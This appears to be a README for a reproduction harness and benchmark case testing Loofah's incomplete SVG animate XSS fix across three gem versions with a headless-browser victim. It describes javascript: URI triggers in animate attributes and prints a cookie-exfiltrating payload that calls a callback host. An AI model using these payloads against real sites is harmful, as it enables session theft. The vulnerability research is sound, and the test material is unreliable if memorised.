# loofah_svg_animate_republish

Loofah (Ruby HTML/SVG sanitizer gem) — CVE-2018-16468 → CVE-2019-15587 (SVG `<animate>`
allow-list narrowing on republish / mXSS, CWE-79).
**Genuine incomplete fix; gate passed on real Docker over EXTERNAL HTTP.**

V1 不完整修复的源码级分析见同目录 [INCOMPLETE_FIX_ANALYSIS.md](INCOMPLETE_FIX_ANALYSIS.md)。

REAL Sinatra/WEBrick service (`app.rb`) runs the REAL published loofah gem over attacker HTML/SVG
(`GET /?html=...`) in a sanitize+REPUBLISH pipeline — `Loofah.fragment(raw).scrub!(:strip).to_s`,
re-parsed and re-serialized a second time (app.rb:38-41) — and serves the output verbatim in a page.
A headless-Chromium victim (selenium grid) carries the per-run `${PCB_FLAG}` as its cookie, views
the republished page and CLICKS the SVG link (the UI:R interaction); the flag reaches the internal
callback ONLY if a smuggled `javascript:` URI survived the allow-list and animated the `<a>` href —
real JS execution, not reflection. No app-level allowlist override: Loofah's DEFAULT SVG-attribute
allow-list IS the guard. nokogiri 1.13.10 + crass 1.0.6 are pinned identical across v0/v1/v2
(build-arg `LOOFAH_VER` is the sole variable).

- **V0 = loofah 2.2.2** (`:35020`) — `from`/`to`/`by`/`values` ALL in the SVG-attribute allow-list
  → the seed's `from=javascript:` survives republish and executes → flag.
- **V1 = loofah 2.2.3** (`:35021`, target) — commit 71e4b54 removed ONLY `from` from
  `lib/loofah/html5/whitelist.rb` → the `from` seed is stripped (href stays the benign `?`) and
  BLOCKED, but `values`/`to`/`by` remain allowed → the `values` residual still executes. Incomplete fix.
- **V2 = loofah 2.3.1** (`:35022`, CVE-2019-15587 fix) — commit 0c6617a removed `by`/`to`/`values`
  (file renamed `whitelist.rb` → `safelist.rb`) → residual BLOCKED.

Benign xss-exfil canary: the smuggled URI reads the victim's OWN cookie
(`document.location='//callback:9000/c?f='+document.cookie`) — no ProcessBuilder, no command
execution; flag at the callback proves the click-navigation really ran.

- **Original trigger**: `javascript:` URI in the `from` attribute of
  `<animate attributeName="xlink:href">` inside an SVG `<a>` (html5sec #137 / hackerone 429267) —
  the exact attribute commit 71e4b54 removes.
- **Residual trigger**: `javascript:` URI in the `values` attribute of
  `<animate href="#foo" attributeName="href">` (the upstream CVE-2019-15587 regression-test payload
  from commit 0c6617a / hackerone 709009) — `values` was left allowed by the 2.2.3 fix.

The mutation: nokogiri's libxml2 HTML4 parser lowercases `attributeName` → `attributename` in the
republished output; Chromium's HTML5 foreign-content "adjust SVG attributes" step restores it on
re-parse, re-activating the SMIL animation.

Run: `PCB_FLAG=... python3 oracle.py --gate` (profiles v0/v1/v2; `--wait` first). See `repro.log`,
`case.json`, `docker-compose.yml`. Gate evidence (repro.log): flag on v0-original / v0-residual /
v1-residual; `[]` on v1-original / v2-original / v2-residual.

> NOTE: `repro.log` line 158 summarizes the browser grid as `selenium/standalone-chromium:latest`,
> but `docker-compose.yml` pins `selenium/standalone-chromium:4.25.0-20240922` — the compose header
> explains `latest` (Chromium 151) never fired the SMIL `javascript:` href, so the pin is the
> authoritative tag; treat the log's `latest` mention as stale. `scripts/prepare.sh` is a no-op
> TODO stub (gems are installed at image build; no runtime migration needed).
